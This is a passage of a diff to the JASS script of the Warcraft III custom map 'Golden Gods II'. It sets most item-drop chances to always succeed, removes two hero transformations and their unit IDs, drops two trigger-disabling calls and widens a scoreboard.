-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Wm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ym takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Ym takes nothing returns boolean
 return(RectContainsUnit(Di,uv))
@@ -10374,22 +11500,22 @@ function vM takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n030')
 endfunction
 function eM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function xM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function oM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function rM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function iM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function plus502 takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function aM takes nothing returns boolean
 return(RectContainsUnit(Ui,uv))
@@ -10443,19 +11569,19 @@ function EM takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n031')
 endfunction
 function XM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function OM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function RM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function IM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function AM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function NM takes nothing returns boolean
 return(RectContainsUnit(wi,uv))
@@ -10505,19 +11631,19 @@ function cM takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n032')
 endfunction
 function CM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function dM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function DM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function fM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function FM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function gM takes nothing returns boolean
 return(RectContainsUnit(Wi,uv))
@@ -10570,19 +11696,19 @@ function jM takes nothing returns boolean
 return(HM())
 endfunction
 function JM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function kM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=30.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function KM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function lM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function LM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function mM takes nothing returns boolean
 return(RectContainsUnit(Ra,uv))
@@ -10610,7 +11736,7 @@ call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv[bj_forLoopAIndex]),0)
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 if(JM())then
-call CreateItemLoc('I048',GetRectCenter(Tv[bj_forLoopAIndex]))
+call CreateItemLoc('I07Y',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(kM())then
@@ -10620,8 +11746,6 @@ endif
 if(KM())then
 call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,("El Jugador |cffffcc00"+(GetPlayerName(GetOwningPlayer(uv))+"|r es suertudo y ha ganado |cffffcc00Box Expert' Premium|r, podra aumentar 1 Rebirth y 1250 SP.")))
 call CreateItemLoc('I07U',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-call CreateItemLoc('I0B2',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(lM())then
@@ -10640,34 +11764,34 @@ function PM takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03C')
 endfunction
 function qM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function droptheitem takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function QM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function SM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function tM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function TM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function uM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function UM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Cronos takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function wM takes nothing returns boolean
 return(RectContainsUnit(Ia,uv))
@@ -10688,8 +11812,6 @@ call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 if(qM())then
 call CreateItemLoc('I07Y',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-call CreateItemLoc('I0B2',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(QM())then
@@ -10743,35 +11865,32 @@ endfunction
 function ladondropCondition takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03K')
 endfunction
-function herculesdropCondition takes nothing returns boolean
-return(GetUnitTypeId(GetDyingUnit())=='n03L')
-endfunction
 function hecatedropCondition takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03I')
 endfunction
 function zM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ZM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function vp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ep takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function xp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function op takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function rp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ip takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ap takes nothing returns boolean
 return(RectContainsUnit(Aa,uv))
@@ -10792,8 +11911,6 @@ call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 if(zM())then
 call CreateItemLoc('I07Y',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-call CreateItemLoc('I0B2',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(ZM())then
@@ -10838,34 +11955,34 @@ function Ep takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03G')
 endfunction
 function Xp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Op takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Rp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Ip takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Ap takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Np takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function bp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Bp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function cp takes nothing returns boolean
 return(RectContainsUnit(Na,uv))
 endfunction
 function plus50 takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Cp takes nothing returns nothing
 set bj_forLoopAIndex=1
@@ -10936,28 +12053,28 @@ function Dp takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03F')
 endfunction
 function fp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Fp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function gp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Gp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function hp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Hp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function jp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Jp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 
 function kp takes nothing returns boolean
@@ -11040,13 +12157,13 @@ function qp takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(Pp()))!=null
 endfunction
 function Qp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=35.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Sp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=1.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function tp takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11071,13 +12188,13 @@ function Up takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(up()))!=null
 endfunction
 function wp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Wp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=35.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function yp takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Yp takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11102,13 +12219,13 @@ function vP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(Zp()))!=null
 endfunction
 function eP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function xP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=35.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function oP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=3.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function rP takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11133,16 +12250,16 @@ function nP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(aP()))!=null
 endfunction
 function VP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function EP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=35.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function XP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function OP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=4.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function RP takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11171,16 +12288,16 @@ function NP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(AP()))!=null
 endfunction
 function bP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function BP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=30.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function cP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.5)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function CP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function dP takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11209,19 +12326,19 @@ function FP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(fP()))!=null
 endfunction
 function gP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function GP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function hP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.75)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function HP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=7.5)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function jP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=1.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function JP takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11254,19 +12371,19 @@ function lP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(KP()))!=null
 endfunction
 function LP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=40.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function mP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=35.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function MP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.85)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function pP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=9.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function PP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function qP takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11299,19 +12416,19 @@ function SP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(sP()))!=null
 endfunction
 function tP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function TP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function uP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=1.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function UP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=3.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function wP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function WP takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11345,7 +12462,7 @@ function zP takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(YP()))!=null
 endfunction
 function ZP takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function vq takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11362,7 +12479,7 @@ function oq takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(xq()))!=null
 endfunction
 function rq takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function iq takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11379,7 +12496,7 @@ function Vq takes nothing returns boolean
 return((IsUnitType(GetDyingUnit(),UNIT_TYPE_HERO)!=true)and(nq()))!=null
 endfunction
 function Eq takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Xq takes nothing returns nothing
 set Uv=GetUnitLoc(GetDyingUnit())
@@ -11503,19 +12620,13 @@ function hecatejob takes nothing returns boolean
 return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=75)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AV'))
 endfunction
 function nemjob takes nothing returns boolean
-return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=175)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AX'))
+return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=75)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AX'))
 endfunction
 function superhuman takes nothing returns boolean
 return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=150)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AO'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AP'))
 endfunction
 function ladonjob takes nothing returns boolean
 return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=200)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AZ'))
-endfunction
-function herculesjob takes nothing returns boolean
-return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=500)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B4'))
-endfunction
-function typhonjob takes nothing returns boolean
-return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=300)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))
 endfunction
 function tq takes nothing returns nothing
 if(dq())then
@@ -11698,17 +12809,6 @@ call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
 set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
 call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
 endif
-if(typhonjob())then
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
-call ReplaceUnitBJ(GetTriggerUnit(),'H021',3)
-call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
-set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
-call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
-endif
 if(superhuman())then
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0AO'))
@@ -11722,14 +12822,6 @@ if(ladonjob())then
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0AZ'))
 call ReplaceUnitBJ(GetTriggerUnit(),'H020',3)
-call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
-set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
-call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
-endif
-if(herculesjob())then
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
-call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B4'))
-call ReplaceUnitBJ(GetTriggerUnit(),'H022',3)
 call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
 set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
 call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
@@ -11906,7 +12998,7 @@ call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LU
 endif
 endfunction
 function AQ takes nothing returns boolean
-return(GetUnitTypeId(GetTriggerUnit())=='H00J')or(GetUnitTypeId(GetTriggerUnit())=='H00A')or(GetUnitTypeId(GetTriggerUnit())=='H007')or(GetUnitTypeId(GetTriggerUnit())=='H00G')or(GetUnitTypeId(GetTriggerUnit())=='H00D')or(GetUnitTypeId(GetTriggerUnit())=='H010')or(GetUnitTypeId(GetTriggerUnit())=='H018')or(GetUnitTypeId(GetTriggerUnit())=='H015')or(GetUnitTypeId(GetTriggerUnit())=='H01A')or(GetUnitTypeId(GetTriggerUnit())=='H01C')or(GetUnitTypeId(GetTriggerUnit())=='H01B')or(GetUnitTypeId(GetTriggerUnit())=='H01E')or(GetUnitTypeId(GetTriggerUnit())=='H01F')or(GetUnitTypeId(GetTriggerUnit())=='H01D')or(GetUnitTypeId(GetTriggerUnit())=='H01P')or(GetUnitTypeId(GetTriggerUnit())=='H01Q')or(GetUnitTypeId(GetTriggerUnit())=='H01S') or(GetUnitTypeId(GetTriggerUnit())=='H01U')or(GetUnitTypeId(GetTriggerUnit())=='H01V')or(GetUnitTypeId(GetTriggerUnit())=='H01W')or(GetUnitTypeId(GetTriggerUnit())=='H01X')or(GetUnitTypeId(GetTriggerUnit())=='H01Y')or(GetUnitTypeId(GetTriggerUnit())=='H01Z')or(GetUnitTypeId(GetTriggerUnit())=='H020')or(GetUnitTypeId(GetTriggerUnit())=='H021')or(GetUnitTypeId(GetTriggerUnit())=='H022')
+return(GetUnitTypeId(GetTriggerUnit())=='H00J')or(GetUnitTypeId(GetTriggerUnit())=='H00A')or(GetUnitTypeId(GetTriggerUnit())=='H007')or(GetUnitTypeId(GetTriggerUnit())=='H00G')or(GetUnitTypeId(GetTriggerUnit())=='H00D')or(GetUnitTypeId(GetTriggerUnit())=='H010')or(GetUnitTypeId(GetTriggerUnit())=='H018')or(GetUnitTypeId(GetTriggerUnit())=='H015')or(GetUnitTypeId(GetTriggerUnit())=='H01A')or(GetUnitTypeId(GetTriggerUnit())=='H01C')or(GetUnitTypeId(GetTriggerUnit())=='H01B')or(GetUnitTypeId(GetTriggerUnit())=='H01E')or(GetUnitTypeId(GetTriggerUnit())=='H01F')or(GetUnitTypeId(GetTriggerUnit())=='H01D')or(GetUnitTypeId(GetTriggerUnit())=='H01P')or(GetUnitTypeId(GetTriggerUnit())=='H01Q')or(GetUnitTypeId(GetTriggerUnit())=='H01S') or(GetUnitTypeId(GetTriggerUnit())=='H01U')or(GetUnitTypeId(GetTriggerUnit())=='H01V')or(GetUnitTypeId(GetTriggerUnit())=='H01W')or(GetUnitTypeId(GetTriggerUnit())=='H01X')or(GetUnitTypeId(GetTriggerUnit())=='H01Y')or(GetUnitTypeId(GetTriggerUnit())=='H01Z')or(GetUnitTypeId(GetTriggerUnit())=='H020')
 endfunction
 function NQ takes nothing returns boolean
 return(GetHeroLevel(GetTriggerUnit())>='d')and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I04J'))and(AQ())
@@ -12122,8 +13214,6 @@ call SetForceAllianceStateBJ(FA(Player(-1+(bj_forLoopAIndex))),FA(Player($B)),0)
 set bj_forLoopAIndex=bj_forLoopAIndex+1
 endloop
 if(hs())then
-call DisableTrigger(eR)
-call DisableTrigger(SaveModuleSingle)
 endif
 endfunction
 function Js takes nothing returns nothing
@@ -12555,9 +13645,7 @@ set I[40]='H01X'
 set I[41]='H01Y'
 set I[42]='H01Z'
 set I[43]='H020'
-set I[44]='H021'
-set I[45]='H022'
-set A=45
+set A=43
 set N=StringLength(e)
 set B=""
 set c[0]=0
@@ -12753,7 +13841,7 @@ return GetBooleanAnd((GetPlayerController(GetFilterPlayer())==MAP_CONTROL_USER),
 endfunction
 function nS takes nothing returns nothing
 set Hx=gA(Condition(function aS))
-call CreateMultiboardBJ(8,(CountPlayersInForceBJ(Hx)+5),"** Golden Gods II **")
+call CreateMultiboardBJ(13,(CountPlayersInForceBJ(Hx)+40),"** Golden Gods II **")
 set Gx=bj_lastCreatedMultiboard
 call MultiboardSetItemStyleBJ(Gx,0,0,true,false)
 call MultiboardSetItemWidthBJ(Gx,0,0,3.)
@@ -12765,6 +13853,39 @@ call MultiboardSetItemWidthBJ(Gx,0,(CountPlayersInForceBJ(Hx)+4),.0)
 call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+4),30.)
 call MultiboardSetItemWidthBJ(Gx,0,(CountPlayersInForceBJ(Hx)+5),.0)
 call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+5),30.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+6),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+7),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+8),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+9),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+10),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+11),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+12),40.)
+call MultiboardSetItemWidthBJ(Gx,1,(CountPlayersInForceBJ(Hx)+13),40.)
